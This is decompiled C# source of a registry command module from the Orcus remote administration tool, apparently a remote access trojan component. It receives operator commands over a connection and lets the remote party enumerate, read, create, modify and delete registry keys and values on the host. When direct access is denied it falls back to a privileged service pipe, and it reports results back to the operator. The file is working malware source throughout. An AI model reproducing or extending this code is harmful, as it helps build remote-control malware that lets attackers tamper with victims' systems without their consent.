using System;
using System.Collections.Generic;
using System.IO;
using System.Security;
using System.Text;
using Microsoft.Win32;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Shared.Commands.Registry;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.RegistryExplorer;

internal class RegistryCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected I4, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Invalid comparison between Unknown and I4
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0224: Expected O, but got Unknown
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Unknown result type (might be due to invalid IL or missing references)
		//IL_0256: Expected O, but got Unknown
		//IL_025d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0264: Expected O, but got Unknown
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Expected O, but got Unknown
		//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030e: Expected O, but got Unknown
		//IL_0312: Unknown result type (might be due to invalid IL or missing references)
		//IL_0317: Unknown result type (might be due to invalid IL or missing references)
		//IL_031f: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_036c: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Invalid comparison between Unknown and I4
		//IL_037d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Expected O, but got Unknown
		//IL_03b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d2: Expected O, but got Unknown
		//IL_03e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		//IL_0417: Invalid comparison between Unknown and I4
		//IL_0426: Unknown result type (might be due to invalid IL or missing references)
		//IL_043e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0444: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_0460: Expected O, but got Unknown
		//IL_0485: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Expected O, but got Unknown
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_0518: Invalid comparison between Unknown and I4
		//IL_052f: Unknown result type (might be due to invalid IL or missing references)
		//IL_055e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0571: Unknown result type (might be due to invalid IL or missing references)
		//IL_059e: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a0: Invalid comparison between Unknown and I4
		//IL_05af: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cd: Expected O, but got Unknown
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_05dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e8: Expected O, but got Unknown
		//IL_05fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0638: Unknown result type (might be due to invalid IL or missing references)
		//IL_0680: Unknown result type (might be due to invalid IL or missing references)
		//IL_0682: Invalid comparison between Unknown and I4
		//IL_0691: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			RegistryCommunication val = (RegistryCommunication)parameter[0];
			switch ((int)val)
			{
			default:
				throw new ArgumentOutOfRangeException();
			case 0:
			{
				RegistryHive val2 = (RegistryHive)(byte)BitConverter.ToInt32(parameter, 1);
				string @string = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
				List<RegistrySubKey> list;
				try
				{
					using RegistryKey registryKey3 = RegistryExtensions.OpenRegistry(val2).OpenSubKey(@string, RegistryKeyPermissionCheck.ReadSubTree);
					list = new List<RegistrySubKey>();
					string[] subKeyNames = registryKey3.GetSubKeyNames();
					foreach (string name in subKeyNames)
					{
						bool isEmpty = false;
						try
						{
							using RegistryKey registryKey4 = registryKey3.OpenSubKey(name, writable: false);
							isEmpty = registryKey4.GetSubKeyNames().Length == 0;
						}
						catch (Exception)
						{
						}
						List<RegistrySubKey> list2 = list;
						RegistrySubKey val3 = new RegistrySubKey();
						val3.set_Name(name);
						val3.set_IsEmpty(isEmpty);
						list2.Add(val3);
					}
				}
				catch (Exception)
				{
					if (!ServiceConnection.Current.IsConnected || (int)val2 == 1)
					{
						throw;
					}
					list = ServiceConnection.Current.Pipe.GetRegistrySubKeys(@string, val2);
					if (list == null)
					{
						throw;
					}
				}
				Serializer val4 = new Serializer(typeof(RegistrySubKeysPackage));
				using MemoryStream memoryStream = new MemoryStream();
				memoryStream.WriteByte(6);
				Serializer obj = val4;
				RegistrySubKeysPackage val5 = new RegistrySubKeysPackage();
				val5.set_Path(@string);
				val5.set_RegistrySubKeys(list);
				val5.set_RegistryHive(val2);
				obj.Serialize((Stream)memoryStream, (object)val5);
				connectionInfo.CommandResponse((Command)(object)this, memoryStream.ToArray(), (PackageCompression)0);
				break;
			}
			case 1:
			{
				RegistryHive val2 = (RegistryHive)(byte)BitConverter.ToInt32(parameter, 1);
				string @string = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
				List<RegistryValue> list3;
				try
				{
					using RegistryKey registryKey6 = RegistryExtensions.OpenRegistry(val2).OpenSubKey(@string, writable: false);
					list3 = new List<RegistryValue>();
					string[] subKeyNames = registryKey6.GetValueNames();
					foreach (string text in subKeyNames)
					{
						switch (registryKey6.GetValueKind(text))
						{
						case RegistryValueKind.String:
						{
							List<RegistryValue> list10 = list3;
							RegistryValueString val13 = new RegistryValueString();
							((RegistryValue)val13).set_Key(text);
							val13.set_Value((string)registryKey6.GetValue(text, string.Empty));
							list10.Add((RegistryValue)val13);
							break;
						}
						case RegistryValueKind.ExpandString:
						{
							List<RegistryValue> list9 = list3;
							RegistryValueExpandString val12 = new RegistryValueExpandString();
							((RegistryValue)val12).set_Key(text);
							val12.set_Value((string)registryKey6.GetValue(text, string.Empty));
							list9.Add((RegistryValue)val12);
							break;
						}
						case RegistryValueKind.Binary:
						{
							List<RegistryValue> list8 = list3;
							RegistryValueBinary val11 = new RegistryValueBinary();
							((RegistryValue)val11).set_Key(text);
							val11.set_Value((byte[])registryKey6.GetValue(text, new byte[0]));
							list8.Add((RegistryValue)(object)val11);
							break;
						}
						case RegistryValueKind.DWord:
						{
							List<RegistryValue> list7 = list3;
							RegistryValueDWord val10 = new RegistryValueDWord();
							((RegistryValue)val10).set_Key(text);
							val10.set_Value((uint)(int)registryKey6.GetValue(text, 0));
							list7.Add((RegistryValue)val10);
							break;
						}
						case RegistryValueKind.MultiString:
						{
							List<RegistryValue> list6 = list3;
							RegistryValueMultiString val9 = new RegistryValueMultiString();
							((RegistryValue)val9).set_Key(text);
							val9.set_Value((string[])registryKey6.GetValue(text, new string[0]));
							list6.Add((RegistryValue)(object)val9);
							break;
						}
						default:
						{
							List<RegistryValue> list5 = list3;
							RegistryValueUnknown val8 = new RegistryValueUnknown();
							((RegistryValue)val8).set_Key(text);
							list5.Add((RegistryValue)val8);
							break;
						}
						case RegistryValueKind.QWord:
						{
							List<RegistryValue> list4 = list3;
							RegistryValueQWord val7 = new RegistryValueQWord();
							((RegistryValue)val7).set_Key(text);
							val7.set_Value((ulong)(long)registryKey6.GetValue(text, 0));
							list4.Add((RegistryValue)val7);
							break;
						}
						}
					}
				}
				catch (Exception)
				{
					if (!ServiceConnection.Current.IsConnected || (int)val2 == 1)
					{
						throw;
					}
					list3 = ServiceConnection.Current.Pipe.GetRegistryValues(@string, val2);
					if (list3 == null)
					{
						throw;
					}
				}
				Serializer val4 = new Serializer((IEnumerable<Type>)new List<Type>(RegistryValue.get_RegistryValueTypes()) { typeof(RegistryValuesPackage) });
				Serializer obj3 = val4;
				RegistryValuesPackage val14 = new RegistryValuesPackage();
				val14.set_Path(@string);
				val14.set_RegistryHive(val2);
				val14.set_Values(list3);
				((Command)this).ResponseBytes((byte)7, obj3.Serialize((object)val14), connectionInfo);
				break;
			}
			case 2:
			{
				RegistryHive val2 = (RegistryHive)(byte)BitConverter.ToInt32(parameter, 1);
				string @string = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
				try
				{
					RegistryExtensions.OpenRegistry(val2).CreateSubKey(@string, RegistryKeyPermissionCheck.Default);
				}
				catch (Exception)
				{
					if (!ServiceConnection.Current.IsConnected || (int)val2 == 1)
					{
						throw;
					}
					if (!ServiceConnection.Current.Pipe.CreateSubKey(@string, val2))
					{
						throw;
					}
				}
				Serializer val4 = new Serializer(typeof(RegistrySubKeyAction));
				Serializer obj4 = val4;
				RegistrySubKeyAction val16 = new RegistrySubKeyAction();
				val16.set_Path(@string);
				val16.set_RegistryHive(val2);
				((Command)this).ResponseBytes((byte)11, obj4.Serialize((object)val16), connectionInfo);
				break;
			}
			case 3:
			{
				Serializer val4 = new Serializer((IEnumerable<Type>)new List<Type>(RegistryValue.get_RegistryValueTypes()) { typeof(RegistryCreateValuePackage) });
				RegistryCreateValuePackage val15 = val4.Deserialize<RegistryCreateValuePackage>(parameter, 1);
				try
				{
					using RegistryKey registryKey7 = RegistryExtensions.OpenRegistry(val15.get_RegistryHive());
					using RegistryKey registryKey8 = registryKey7.OpenSubKey(val15.get_Path(), writable: true);
					registryKey8.SetValue(val15.get_RegistryValue().get_Key(), val15.get_RegistryValue().get_ValueObject(), ConvertFromOrcusValueKind(val15.get_RegistryValue().get_ValueKind()));
				}
				catch (Exception)
				{
					if (!ServiceConnection.Current.IsConnected || (int)val15.get_RegistryHive() == 1)
					{
						throw;
					}
					if (!ServiceConnection.Current.Pipe.CreateValue(val15.get_Path(), val15.get_RegistryHive(), val15.get_RegistryValue()))
					{
						throw;
					}
				}
				((Command)this).ResponseByte((byte)12, connectionInfo);
				break;
			}
			case 4:
			{
				RegistryHive val2 = (RegistryHive)(byte)BitConverter.ToInt32(parameter, 1);
				string @string = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
				try
				{
					using RegistryKey registryKey5 = RegistryExtensions.OpenRegistry(val2);
					registryKey5.DeleteSubKeyTree(@string);
				}
				catch (Exception)
				{
					if (!ServiceConnection.Current.IsConnected || (int)val2 == 1)
					{
						throw;
					}
					if (!ServiceConnection.Current.Pipe.DeleteSubKey(@string, val2))
					{
						throw;
					}
				}
				Serializer val4 = new Serializer(typeof(RegistrySubKeyAction));
				Serializer obj2 = val4;
				RegistrySubKeyAction val6 = new RegistrySubKeyAction();
				val6.set_Path(@string);
				val6.set_RegistryHive(val2);
				((Command)this).ResponseBytes((byte)8, obj2.Serialize((object)val6), connectionInfo);
				break;
			}
			case 5:
			{
				RegistryHive val2 = (RegistryHive)(byte)BitConverter.ToInt32(parameter, 1);
				int count = BitConverter.ToInt32(parameter, 5);
				string @string = Encoding.UTF8.GetString(parameter, 9, count);
				string string2 = Encoding.UTF8.GetString(parameter, 9 + @string.Length, parameter.Length - (9 + @string.Length));
				try
				{
					using RegistryKey registryKey = RegistryExtensions.OpenRegistry(val2);
					using RegistryKey registryKey2 = registryKey.OpenSubKey(@string, writable: true);
					registryKey2.DeleteValue(string2, throwOnMissingValue: true);
				}
				catch (Exception)
				{
					if (!ServiceConnection.Current.IsConnected || (int)val2 == 1)
					{
						throw;
					}
					if (!ServiceConnection.Current.Pipe.DeleteValue(@string, val2, string2))
					{
						throw;
					}
				}
				((Command)this).ResponseByte((byte)13, connectionInfo);
				break;
			}
			}
		}
		catch (Exception ex8)
		{
			if (!(ex8 is SecurityException) && !(ex8 is UnauthorizedAccessException))
			{
				SendError(ex8.Message, connectionInfo);
			}
			else
			{
				SendPermissionDenied(ex8.Message, connectionInfo);
			}
		}
	}

	private RegistryValueKind ConvertFromOrcusValueKind(RegistryValueKind registryValue)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected I4, but got Unknown
		return (int)registryValue switch
		{
			0 => RegistryValueKind.String, 
			1 => RegistryValueKind.ExpandString, 
			2 => RegistryValueKind.Binary, 
			3 => RegistryValueKind.DWord, 
			4 => RegistryValueKind.MultiString, 
			5 => RegistryValueKind.QWord, 
			_ => RegistryValueKind.Unknown, 
		};
	}

	private void SendPermissionDenied(string message, IConnectionInfo connectionInfo)
	{
		List<byte> list = new List<byte> { 9 };
		list.AddRange(Encoding.UTF8.GetBytes(message));
		connectionInfo.CommandResponse((Command)(object)this, list.ToArray(), (PackageCompression)0);
	}

	private void SendError(string message, IConnectionInfo connectionInfo)
	{
		List<byte> list = new List<byte> { 10 };
		list.AddRange(Encoding.UTF8.GetBytes(message));
		connectionInfo.CommandResponse((Command)(object)this, list.ToArray(), (PackageCompression)0);
	}

	protected override uint GetId()
	{
		return 13u;
	}
}
